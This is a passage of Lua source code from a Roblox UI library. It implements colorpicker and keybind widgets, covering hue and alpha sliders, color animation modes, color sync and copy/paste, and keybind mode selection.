                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["HueInline"] = Instances:Create("TextButton", {
                    Parent = Items["Hue"].Instance,
                    AutoButtonColor = false,
                    Text = "",
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 1, 0),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIGradient", {
                    Parent = Items["HueInline"].Instance,
                    Name = "\0",
                    Rotation = 90,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 0, 0)), RGBSequenceKeypoint(0.17, FromRGB(255, 255, 0)), RGBSequenceKeypoint(0.33, FromRGB(0, 255, 0)), RGBSequenceKeypoint(0.5, FromRGB(0, 255, 255)), RGBSequenceKeypoint(0.67, FromRGB(0, 0, 255)), RGBSequenceKeypoint(0.83, FromRGB(255, 0, 255)), RGBSequenceKeypoint(1, FromRGB(255, 0, 0))}
                })

                Items["HueDragger"] = Instances:Create("Frame", {
                    Parent = Items["Hue"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(1, 0, 0, 1),
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIStroke", {
                    Parent = Items["HueDragger"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["Alpha"] = Instances:Create("TextButton", {
                    Parent = ColorTabItems["PageContent"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(0, 0, 0),
                    BorderColor3 = FromRGB(42, 49, 45),
                    Text = "",
                    AutoButtonColor = false,
                    AnchorPoint = Vector2New(0, 1),
                    Position = UDim2New(0, 8, 1, -8),
                    Size = UDim2New(1, -46, 0, 20),
                    BorderSizePixel = 2,
                    TextSize = 14,
                    BackgroundColor3 = FromRGB(157, 175, 255)
                })  Items["Alpha"]:AddToTheme({BorderColor3 = "Outline"})

                Instances:Create("UIStroke", {
                    Parent = Items["Alpha"].Instance,   
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Items["Checkers"] = Instances:Create("ImageLabel", {
                    Parent = Items["Alpha"].Instance,
                    Name = "\0",
                    ScaleType = Enum.ScaleType.Tile,
                    BorderColor3 = FromRGB(0, 0, 0),
                    TileSize = UDim2New(0, 6, 0, 6),
                    Image = Library:GetImage("Checkers"),
                    BackgroundTransparency = 1,
                    Size = UDim2New(1, 0, 1, 0),
                    ZIndex = 2,
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  

                Instances:Create("UIGradient", {
                    Parent = Items["Checkers"].Instance,
                    Name = "\0",
                    Transparency = NumSequence{NumSequenceKeypoint(0, 1), NumSequenceKeypoint(0.37, 0.5), NumSequenceKeypoint(1, 0)}
                })

                Items["AlphaDragger"] = Instances:Create("Frame", {
                    Parent = Items["Alpha"].Instance,
                    Name = "\0",
                    BorderColor3 = FromRGB(0, 0, 0),
                    Size = UDim2New(0, 1, 1, 0),
                    ZIndex = 5,
                    BorderSizePixel = 0,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Instances:Create("UIStroke", {
                    Parent = Items["AlphaDragger"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})
            end

            if AnimationsTab then
                AnimationsDropdown, AnimationsDropdownItems = Components:Dropdown({
                    Parent = AnimationsTabItems["PageContent"],
                    Name = "Animations",
                    Items = {"Rainbow", "Fade", "Fade alpha", "Linear"},
                    Default = nil,
                    Flag = Colorpicker.Flag.."Animation",
                    Multi = false,
                    Debounce = Colorpicker,
                    Callback = function(Value)
                        CurrentAnimation = Value
                        if Value == "Rainbow" then 
                            if KeyframeOneLabel and KeyframeTwoLabel and AnimationSpeedSlider then
                                KeyframeOneLabel:SetVisibility(false)
                                KeyframeTwoLabel:SetVisibility(false)

                                AnimationSpeedSliderItems["Slider"].Instance.Position = UDim2New(0, 8, 0, 45)
                            end

                            OldColor = Colorpicker.Color

                            Library:Thread(function()
                                while task.wait() do 
                                    local RainbowHue = MathAbs(MathSin(tick() * (AnimationSpeedSlider.Value / 25)))
                                    local Color = FromHSV(RainbowHue, 1, 1)

                                    Colorpicker:Set(Color, Colorpicker.Alpha)
                                    UpdateSync(true)

                                    if CurrentAnimation ~= "Rainbow" then
                                        Colorpicker:Set(OldColor, Colorpicker.Alpha)
                                        break
                                    end
                                end
                            end)
                        elseif Value == "Fade" then 
                            if KeyframeOneLabel and KeyframeTwoLabel and AnimationSpeedSlider then
                                KeyframeOneLabel:SetVisibility(true)
                                KeyframeTwoLabel:SetVisibility(false)

                                AnimationSpeedSliderItems["Slider"].Instance.Position = UDim2New(0, 8, 0, 65)

                                OldColor = Colorpicker.Color
                                
                                Library:Thread(function()
                                    while task.wait() do 
                                        local Speed = MathAbs(MathSin(tick() * (AnimationSpeedSlider.Value / 25)))
                                        Colorpicker:Set(KeyframeOneColorpicker.Color:Lerp(FromRGB(0, 0, 0), Speed), Colorpicker.Alpha)
                                        UpdateSync(true)

                                        if CurrentAnimation ~= "Fade" then
                                            Colorpicker:Set(OldColor, Colorpicker.Alpha)
                                            break
                                        end
                                    end
                                end)
                            end
                        elseif Value == "Fade alpha" then
                            if KeyframeOneLabel and KeyframeTwoLabel then
                                KeyframeOneLabel:SetVisibility(false)
                                KeyframeTwoLabel:SetVisibility(false)

                                AnimationSpeedSliderItems["Slider"].Instance.Position = UDim2New(0, 8, 0, 45)

                                OldColor = Colorpicker.Alpha
                                
                                Library:Thread(function()
                                    while task.wait() do 
                                        local AlphaValue = MathAbs(MathSin(tick() * (AnimationSpeedSlider.Value / 25)))
                                        Colorpicker:Set(Colorpicker.Color, AlphaValue)
                                        UpdateSync(true)

                                        if CurrentAnimation ~= "Fade alpha" then
                                            Colorpicker:Set(Colorpicker.Color, OldAlpha)
                                            break
                                        end
                                    end
                                end)
                            end
                        elseif Value == "Linear" then
                            if KeyframeOneLabel and KeyframeTwoLabel then
                                KeyframeOneLabel:SetVisibility(true)
                                KeyframeTwoLabel:SetVisibility(true)

                                AnimationSpeedSliderItems["Slider"].Instance.Position = UDim2New(0, 8, 0, 85)

                                OldColor = Colorpicker.Color
                                
                                Library:Thread(function()
                                    while task.wait() do 
                                        local Speed = MathAbs(MathSin(tick() * (AnimationSpeedSlider.Value / 25)))
                                        Colorpicker:Set(KeyframeOneColorpicker.Color:Lerp(KeyframeTwoColorpicker.Color, Speed), Colorpicker.Alpha)
                                        UpdateSync(true)

                                        if CurrentAnimation ~= "Linear" then
                                            Colorpicker:Set(OldColor, Colorpicker.Alpha)
                                            break
                                        end
                                    end
                                end)
                            end
                        end
                    end
                })

                AnimationsDropdownItems["Dropdown"].Instance.Position = UDim2New(0, 8, 0, 0)
                AnimationsDropdownItems["Dropdown"].Instance.Size = UDim2New(1, -16, 0, 40)

                KeyframeOneLabel, KeyframeOneLabelItems = Components:Label({
                    Parent = AnimationsTabItems["PageContent"],
                    Name = "Keyframe 1",
                })

                KeyframeOneLabelItems["Label"].Instance.Position = UDim2New(0, 8, 0, 45)
                KeyframeOneLabelItems["Label"].Instance.Size = UDim2New(1, -16, 0, 20)

                KeyframeTwoLabel, KeyframeTwoLabelItems = Components:Label({
                    Parent = AnimationsTabItems["PageContent"],
                    Name = "Keyframe 2",
                })

                KeyframeTwoLabelItems["Label"].Instance.Position = UDim2New(0, 8, 0, 65)
                KeyframeTwoLabelItems["Label"].Instance.Size = UDim2New(1, -16, 0, 20)

                KeyframeOneColorpicker, KeyframeOneColorpickerItems = Components:Colorpicker({
                    Parent = KeyframeOneLabelItems["SubElements"],
                    Alpha = 0,
                    Pages = false,
                    Default = Color3.fromRGB(255, 255, 255),
                    Flag = Colorpicker.Flag.."Animation".."Keyframe1",
                    Debounce = Colorpicker,
                })

                KeyframeTwoColorpicker, KeyframeTwoColorpickerItems = Components:Colorpicker({
                    Parent = KeyframeTwoLabelItems["SubElements"],
                    Alpha = 0,
                    Pages = false,
                    Default = Color3.fromRGB(0, 0, 0),
                    Debounce = Colorpicker,
                    Flag = Colorpicker.Flag.."Animation".."Keyframe2",
                })

                AnimationSpeedSlider, AnimationSpeedSliderItems = Components:Slider({
                    Parent = AnimationsTabItems["PageContent"],
                    Name = "Speed",
                    Flag = Colorpicker.Flag .. "AnimationSpeed",
                    Min = 0,
                    Max = 100,
                    Decimals = 0.1,
                    Default = 20,
                    Suffix = "%",
                })

                AnimationSpeedSliderItems["Slider"].Instance.Position = UDim2New(0, 8, 0, 85)
                AnimationSpeedSliderItems["Slider"].Instance.Size = UDim2New(1, -16, 0, 28)
            end

            local IsSyncToggled

            if OtherTab then
                Items["CurrentColor"] = Instances:Create("Frame", {
                    Parent = OtherTabItems["PageContent"].Instance,
                    Name = "\0",
                    Position = UDim2New(0, 8, 0, 8),
                    BorderColor3 = FromRGB(42, 49, 45),
                    Size = UDim2New(1, -16, 0, 50),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(157, 175, 255)
                })  Items["CurrentColor"]:AddToTheme({BorderColor3 = "Outline"})

                Instances:Create("UIStroke", {
                    Parent = Items["CurrentColor"].Instance,
                    Name = "\0",
                    Color = FromRGB(12, 12, 12),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Border"})

                Instances:Create("UIGradient", {
                    Parent = Items["CurrentColor"].Instance,
                    Name = "\0",
                    Rotation = 82,
                    Color = RGBSequence{RGBSequenceKeypoint(0, FromRGB(255, 255, 255)), RGBSequenceKeypoint(1, FromRGB(154, 154, 154))}
                })

                Items["RGBColor"] = Instances:Create("TextLabel", {
                    Parent = OtherTabItems["PageContent"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "RGB:",
                    Size = UDim2New(1, -16, 0, 15),
                    Position = UDim2New(0, 8, 0, 65),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    BorderSizePixel = 0,
                    RichText = true,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["HEXColor"] = Instances:Create("TextLabel", {
                    Parent = OtherTabItems["PageContent"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "HEX:",
                    Size = UDim2New(1, -16, 0, 15),
                    Position = UDim2New(0, 8, 0, 85),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    BorderSizePixel = 0,
                    RichText = true,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                Items["HSVColor"] = Instances:Create("TextLabel", {
                    Parent = OtherTabItems["PageContent"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "HSV:",
                    Size = UDim2New(1, -16, 0, 15),
                    Position = UDim2New(0, 8, 0, 105),
                    BackgroundTransparency = 1,
                    TextXAlignment = Enum.TextXAlignment.Left,
                    BorderSizePixel = 0,
                    RichText = true,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })

                local CopyNPasteButton, CopyNPasteButtonItems = Components:Button({
                    Parent = OtherTabItems["PageContent"],
                })

                CopyNPasteButtonItems["Button"].Instance.Position = UDim2New(0, 8, 0, 145)
                CopyNPasteButtonItems["Button"].Instance.Size = UDim2New(1, -16, 0, 20)

                CopyNPasteButton:Add("Copy", function()
                    Library.CopiedColor = Colorpicker.Color
                end)

                CopyNPasteButton:Add("Paste", function()
                    if Library.CopiedColor then
                        Colorpicker:Set(Library.CopiedColor)
                    end
                end)

                local Stash = { }

                IsSyncToggled = false

                local SyncColorpickersToggle, SyncColorpickerToggleItems = Components:Toggle({
                    Parent = OtherTabItems["PageContent"],
                    Flag = "SyncColorpickers"..Colorpicker.Flag,
                    Name = "Sync colorpickers",
                    Default = false,
                    Callback = function(Value)
                        IsSyncToggled = Value
                        if Value then 
                            for Index, Value in Library.Colorpickers do 
                                Stash[Value] = Value.Color
                                Value:Set(Colorpicker.Color)
                            end
                        else
                            for Index, Value in Library.Colorpickers do 
                                if Stash[Value] then
                                    Value:Set(Stash[Value])
                                end
                            end
                        end
                    end
                })

                SyncColorpickerToggleItems["Toggle"].Instance.Position = UDim2New(0, 8, 0, 125)
                SyncColorpickerToggleItems["Toggle"].Instance.Size = UDim2New(1, -16, 0, 12)
            end

            local Debounce = false
            local RenderStepped  

            function Colorpicker:SetOpen(Bool)
                if Debounce then 
                    return
                end

                Colorpicker.IsOpen = Bool

                Debounce = true 

                if Colorpicker.IsOpen then 
                    Items["ColorpickerWindow"].Instance.Visible = true
                    Items["ColorpickerWindow"].Instance.Parent = Library.Holder.Instance
                    
                    RenderStepped = RunService.RenderStepped:Connect(function()
                        Items["ColorpickerWindow"].Instance.Position = UDim2New(0, Items["ColorpickerButton"].Instance.AbsolutePosition.X, 0, Items["ColorpickerButton"].Instance.AbsolutePosition.Y + Items["ColorpickerButton"].Instance.AbsoluteSize.Y + 5)
                    end)

                    if not Data.Debounce then
                        for Index, Value in Library.OpenFrames do 
                            if Value ~= Colorpicker and Value ~= AnimationsDropdownItems then 
                                Value:SetOpen(false)
                            end
                        end

                        Library.OpenFrames[Colorpicker] = Colorpicker 
                    end
                else
                    if not Data.Debounce then 
                        if Library.OpenFrames[Colorpicker] then 
                            Library.OpenFrames[Colorpicker] = nil
                        end
                    end

                    if RenderStepped then 
                        RenderStepped:Disconnect()
                        RenderStepped = nil
                    end
                end

                local Descendants = Items["ColorpickerWindow"].Instance:GetDescendants()
                TableInsert(Descendants, Items["ColorpickerWindow"].Instance)

                local NewTween

                for Index, Value in Descendants do 
                    local TransparencyProperty = Tween:GetProperty(Value)

                    if not TransparencyProperty then
                        continue 
                    end

                    if type(TransparencyProperty) == "table" then 
                        for _, Property in TransparencyProperty do 
                            NewTween = Tween:FadeItem(Value, Property, Bool, Library.FadeSpeed)
                        end
                    else
                        NewTween = Tween:FadeItem(Value, TransparencyProperty, Bool, Library.FadeSpeed)
                    end
                end
                
                NewTween.Tween.Completed:Connect(function()
                    Debounce = false 
                    Items["ColorpickerWindow"].Instance.Visible = Colorpicker.IsOpen
                    task.wait(0.2)
                    Items["ColorpickerWindow"].Instance.Parent = not Colorpicker.IsOpen and Library.UnusedHolder.Instance or Library.Holder.Instance
                end)
            end

            UpdateSync = function(Bool)
                if IsSyncToggled and Bool then 
                    for Index, Value in Library.Colorpickers do 
                        if Value ~= Colorpicker and not StringFind(Value.Flag, "Theme") then
                            Value:Set(Colorpicker.Color)
                        end
                    end
                end
            end

            function Colorpicker:Update(IsFromAlpha, UpdateSyncc)
                local Hue, Saturation, Value = Colorpicker.Hue, Colorpicker.Saturation, Colorpicker.Value
                Colorpicker.Color = FromHSV(Hue, Saturation, Value)
                Colorpicker.HexValue = Colorpicker.Color:ToHex()

                Library.Flags[Colorpicker.Flag] = {
                    Alpha = Colorpicker.Alpha,
                    Color = Colorpicker.HexValue
                }

                Items["ColorpickerButton"]:Tween(nil, {BackgroundColor3 = Colorpicker.Color})
                Items["ColorpickerButtonInline"]:Tween(nil, {BackgroundColor3 = Colorpicker.Color})

                UpdateSync(UpdateSyncc)

                if OtherTab then
                    Items["CurrentColor"]:Tween(nil, {BackgroundColor3 = Colorpicker.Color})

                    local Red = MathFloor(Colorpicker.Color.R * 255)
                    local Green = MathFloor(Colorpicker.Color.G * 255)
                    local Blue = MathFloor(Colorpicker.Color.B * 255)
                    local RedGreenBlue = tostring(Red) .. ", " .. tostring(Green) .. ", " .. tostring(Blue)

                    local FloorHue, FloorSat, FloorVal = nil, nil, nil

                    Items["RGBColor"].Instance.Text = "RGB: "..RedGreenBlue
                    Items["HSVColor"].Instance.Text = `HSV: %1, %1, %1`
                    Items["HEXColor"].Instance.Text = "HEX: " .. "#" .. Colorpicker.HexValue
                end

                Items["Palette"]:Tween(nil, {BackgroundColor3 = FromHSV(Hue, 1, 1)})

                if not IsFromAlpha then 
                    Items["Alpha"]:Tween(nil, {BackgroundColor3 = Colorpicker.Color})
                end

                if Data.Callback then 
                    Library:SafeCall(Data.Callback, Colorpicker.Color, Colorpicker.Alpha)
                end
            end

            function Colorpicker:Set(Color, Alpha)
                if type(Color) == "table" then
                    Color = FromRGB(Color[1], Color[2], Color[3])
                    Alpha = Color[4]
                elseif type(Color) == "string" then
                    Color = FromHex(Color)
                end 

                Colorpicker.Hue, Colorpicker.Saturation, Colorpicker.Value = Color:ToHSV()
                Colorpicker.Alpha = Alpha or 0  

                local PaletteValueX = MathClamp(1 - Colorpicker.Saturation, 0, 0.99)
                local PaletteValueY = MathClamp(1 - Colorpicker.Value, 0, 0.99)

                local AlphaPositionX = MathClamp(Colorpicker.Alpha, 0, 0.995)
                    
                local HuePositionY = MathClamp(Colorpicker.Hue, 0, 0.995)

                Items["PaletteDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(PaletteValueX, 0, PaletteValueY, 0)})
                Items["HueDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(0, 0, HuePositionY, 0)})
                Items["AlphaDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(AlphaPositionX, 0, 0, 0)})
                Colorpicker:Update(true, true)
            end

            Items["ColorpickerButton"]:Connect("MouseButton1Down", function()
                Colorpicker:SetOpen(not Colorpicker.IsOpen)
            end)

            local SlidingPalette = false
            local PaletteChanged
            
            function Colorpicker:SlidePalette(Input)
                if not Input or not SlidingPalette then
                    return
                end

                local ValueX = MathClamp(1 - (Input.Position.X - Items["Palette"].Instance.AbsolutePosition.X) / Items["Palette"].Instance.AbsoluteSize.X, 0, 1)
                local ValueY = MathClamp(1 - (Input.Position.Y - Items["Palette"].Instance.AbsolutePosition.Y) / Items["Palette"].Instance.AbsoluteSize.Y, 0, 1)

                Colorpicker.Saturation = ValueX
                Colorpicker.Value = ValueY

                local SlideX = MathClamp((Input.Position.X - Items["Palette"].Instance.AbsolutePosition.X) / Items["Palette"].Instance.AbsoluteSize.X, 0, 0.99)
                local SlideY = MathClamp((Input.Position.Y - Items["Palette"].Instance.AbsolutePosition.Y) / Items["Palette"].Instance.AbsoluteSize.Y, 0, 0.99)

                Items["PaletteDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(SlideX, 0, SlideY, 0)})
                Colorpicker:Update(false, true)
            end
            
            local SlidingHue = false
            local HueChanged

            function Colorpicker:SlideHue(Input)
                if not Input or not SlidingHue then
                    return
                end
                
                local ValueY = MathClamp((Input.Position.Y - Items["Hue"].Instance.AbsolutePosition.Y) / Items["Hue"].Instance.AbsoluteSize.Y, 0, 1)

                Colorpicker.Hue = ValueY

                local SlideY = MathClamp((Input.Position.Y - Items["Hue"].Instance.AbsolutePosition.Y) / Items["Hue"].Instance.AbsoluteSize.Y, 0, 0.995)

                Items["HueDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(0, 0, SlideY, 0)})
                Colorpicker:Update(false, true)
            end

            local SlidingAlpha = false 
            local AlphaChanged

            function Colorpicker:SlideAlpha(Input)
                if not Input or not SlidingAlpha then
                    return
                end

                local ValueX = MathClamp((Input.Position.X - Items["Alpha"].Instance.AbsolutePosition.X) / Items["Alpha"].Instance.AbsoluteSize.X, 0, 1)

                Colorpicker.Alpha = ValueX

                local SlideX = MathClamp((Input.Position.X - Items["Alpha"].Instance.AbsolutePosition.X) / Items["Alpha"].Instance.AbsoluteSize.X, 0, 0.995)

                Items["AlphaDragger"]:Tween(TweenInfo.new(Library.Tween.Time, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Position = UDim2New(SlideX, 0, 0, 0)})
                Colorpicker:Update(true, true)
            end

            Items["Palette"]:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    SlidingPalette = true 

                    Colorpicker:SlidePalette(Input)

                    if PaletteChanged then
                        return
                    end

                    PaletteChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            SlidingPalette = false

                            PaletteChanged:Disconnect()
                            PaletteChanged = nil
                        end
                    end)
                end
            end)

            Items["HueInline"]:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    SlidingHue = true 

                    Colorpicker:SlideHue(Input)

                    if HueChanged then
                        return
                    end

                    HueChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            SlidingHue = false

                            HueChanged:Disconnect()
                            HueChanged = nil
                        end
                    end)
                end
            end)

            Items["Alpha"]:Connect("InputBegan", function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    SlidingAlpha = true 

                    Colorpicker:SlideAlpha(Input)

                    if AlphaChanged then
                        return
                    end

                    AlphaChanged = Input.Changed:Connect(function()
                        if Input.UserInputState == Enum.UserInputState.End then
                            SlidingAlpha = false

                            AlphaChanged:Disconnect()
                            AlphaChanged = nil
                        end
                    end)
                end
            end)

            Library:Connect(UserInputService.InputChanged, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseMovement or Input.UserInputType == Enum.UserInputType.Touch then
                    if SlidingPalette then 
                        Colorpicker:SlidePalette(Input)
                    end

                    if SlidingHue then
                        Colorpicker:SlideHue(Input)
                    end

                    if SlidingAlpha then
                        Colorpicker:SlideAlpha(Input)
                    end
                end
            end)

            Library:Connect(UserInputService.InputBegan, function(Input)
                if Input.UserInputType == Enum.UserInputType.MouseButton1 or Input.UserInputType == Enum.UserInputType.Touch then
                    if not Colorpicker.IsOpen then
                        return
                    end

                    if Library:IsMouseOverFrame(Items["ColorpickerWindow"]) then
                        return
                    end

                    if KeyframeOneLabel and KeyframeTwoLabel then
                        if Library:IsMouseOverFrame(KeyframeOneColorpickerItems["ColorpickerWindow"]) then
                            return
                        end

                        if Library:IsMouseOverFrame(KeyframeTwoColorpickerItems["ColorpickerWindow"]) then
                            return
                        end
                    end

                    Colorpicker:SetOpen(false)
                end
            end)

            if Data.Default then
                Colorpicker:Set(Data.Default, Data.Alpha)
                OldColor = Colorpicker.Color
            end

            Library.Colorpickers[Colorpicker] = Colorpicker

            Library.SetFlags[Colorpicker.Flag] = function(Value, Alpha)
                Colorpicker:Set(Value, Alpha)
            end

            return Colorpicker, Items
        end

        Components.Keybind = function(self, Data)
            local Keybind = { 
                IsOpen = false,

                Key = "",
                Value = "",

                Flag = Data.Flag,

                Mode = "",

                Toggled = false,

                Picking = false
            }

            local KeylistItem

            if Library.KeyList then
                KeylistItem = Library.KeyList:Add("", "", "")
            end

            local Items = { } do
                Items["KeyButton"] = Instances:Create("TextButton", {
                    Parent = Data.Parent.Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    TextTransparency = 0.4000000059604645,
                    Text = "MB2",
                    AutoButtonColor = false,
                    Size = UDim2New(0, 0, 1, 0),
                    BackgroundTransparency = 1,
                    BorderSizePixel = 0,
                    BorderColor3 = FromRGB(0, 0, 0),
                    AutomaticSize = Enum.AutomaticSize.X,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(255, 255, 255)
                })  Items["KeyButton"]:AddToTheme({TextColor3 = "Text"})
                
                Items["KeyButton"]:TextBorder()
                
                Items["KeybindWindow"] = Instances:Create("Frame", {
                    Parent = Library.UnusedHolder.Instance,
                    Name = "\0",
                    Position = UDim2New(0.007692307699471712, 0, 0.35323384404182434, 0),
                    BorderColor3 = FromRGB(12, 12, 12),
                    Size = UDim2New(0, 70, 0, 90),
                    BorderSizePixel = 2,
                    BackgroundColor3 = FromRGB(14, 17, 15)
                })  Items["KeybindWindow"]:AddToTheme({BackgroundColor3 = "Background", BorderColor3 = "Border"})

                Items["Toggle"] = Instances:Create("TextButton", {
                    Parent = Items["KeybindWindow"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "Toggle",
                    AutoButtonColor = false,
                    Position = UDim2New(0, 8, 0, 8),
                    Size = UDim2New(1, -16, 0, 20),
                    BorderSizePixel = 0,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Toggle"]:AddToTheme({BackgroundColor3 = "Accent", TextColor3 = "Text"})

                Items["Toggle"]:TextBorder()

                Instances:Create("UIStroke", {
                    Parent = Items["KeybindWindow"].Instance,
                    Name = "\0",
                    Color = FromRGB(42, 49, 45),
                    LineJoinMode = Enum.LineJoinMode.Miter,
                    ApplyStrokeMode = Enum.ApplyStrokeMode.Border
                }):AddToTheme({Color = "Outline"})

                Items["Hold"] = Instances:Create("TextButton", {
                    Parent = Items["KeybindWindow"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "Hold",
                    AutoButtonColor = false,
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, 8, 0, 38),
                    Size = UDim2New(1, -16, 0, 20),
                    BorderSizePixel = 0,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Hold"]:AddToTheme({BackgroundColor3 = "Accent", TextColor3 = "Text"})

                Items["Hold"]:TextBorder()

                Items["Always"] = Instances:Create("TextButton", {
                    Parent = Items["KeybindWindow"].Instance,
                    Name = "\0",
                    FontFace = Library.Font,
                    TextColor3 = FromRGB(235, 235, 235),
                    BorderColor3 = FromRGB(0, 0, 0),
                    Text = "Always",
                    AutoButtonColor = false,
                    BackgroundTransparency = 1,
                    Position = UDim2New(0, 8, 0, 68),
                    Size = UDim2New(1, -16, 0, 20),
                    BorderSizePixel = 0,
                    TextSize = 9,
                    BackgroundColor3 = FromRGB(202, 243, 255)
                })  Items["Always"]:AddToTheme({BackgroundColor3 = "Accent", TextColor3 = "Text"})  

                Items["Always"]:TextBorder()
            end

            local Modes = {
                ["Toggle"] = Items["Toggle"],
                ["Hold"] = Items["Hold"],
                ["Always"] = Items["Always"]
            }

            local Update = function()
                if KeylistItem then
                    KeylistItem:SetText(Keybind.Value, Data.Name, Keybind.Mode)
                    KeylistItem:SetStatus(Keybind.Toggled)
                end
            end

            function Keybind:Get()
                return Keybind.Key, Keybind.Mode, Keybind.Toggled
            end

            function Keybind:Set(Key)
                if StringFind(tostring(Key), "Enum") then 
                    Keybind.Key = tostring(Key)

                    Key = Key.Name == "Backspace" and "None" or Key.Name

                    local KeyString = Keys[Keybind.Key] or StringGSub(Key, "Enum.", "") or "None"
                    local TextToDisplay = StringGSub(StringGSub(KeyString, "KeyCode.", ""), "UserInputType.", "") or "None"

                    Keybind.Value = TextToDisplay
                    Items["KeyButton"].Instance.Text = TextToDisplay

                    Library.Flags[Keybind.Flag] = {
                        Mode = Keybind.Mode,
                        Key = Keybind.Key,
                        Toggled = Keybind.Toggled
                    }

                    if Data.Callback then 
                        Library:SafeCall(Data.Callback, Keybind.Toggled)
                    end

                    Update()
                elseif type(Key) == "table" then
                    local RealKey = Key.Key == "Backspace" and "None" or Key.Key
                    Keybind.Key = tostring(Key.Key)

                    if Key.Mode then
                        Keybind.Mode = Key.Mode
                        Keybind:SetMode(Key.Mode)
                    else
                        Keybind.Mode = "Toggle"
                        Keybind:SetMode("Toggle")
                    end

                    local KeyString = Keys[Keybind.Key] or StringGSub(tostring(RealKey), "Enum.", "") or RealKey
                    local TextToDisplay = KeyString and StringGSub(StringGSub(KeyString, "KeyCode.", ""), "UserInputType.", "") or "None"

                    TextToDisplay = StringGSub(StringGSub(KeyString, "KeyCode.", ""), "UserInputType.", "")

                    Keybind.Value = TextToDisplay
                    Items["KeyButton"].Instance.Text = TextToDisplay

                    if Data.Callback then 
                        Library:SafeCall(Data.Callback, Keybind.Toggled)
                    end

                    Update()
                elseif TableFind({"Toggle", "Hold", "Always"}, Key) then
                    Keybind.Mode = Key
                    Keybind:SetMode(Keybind.Mode)

                    if Data.Callback then 
                        Library:SafeCall(Data.Callback, Keybind.Toggled)
                    end

                    Update()
                end

                Keybind.Picking = false
            end

            local Debounce = false
            local RenderStepped  

            function Keybind:SetOpen(Bool)
                if Debounce then 
                    return
                end

                Keybind.IsOpen = Bool

                Debounce = true 

                if Keybind.IsOpen then 
                    Items["KeybindWindow"].Instance.Visible = true
                    Items["KeybindWindow"].Instance.Parent = Library.Holder.Instance
                    
